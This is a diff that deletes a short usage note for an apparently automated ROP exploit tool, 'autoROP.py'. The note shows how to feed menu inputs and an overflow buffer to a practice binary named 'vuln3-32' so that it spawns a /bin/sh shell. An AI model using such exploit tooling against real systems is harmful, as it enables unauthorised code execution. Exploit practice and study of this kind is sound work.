@@ -1,3 +1,0 @@
-assuming vuln3 has a menu, 1st stdio is y, 2nd is n then buffer overflow then y
-
-python3 autoROP.py vuln3-32 /bin//sh --fileinput 0 --template '['y','n','$$buff','y']'
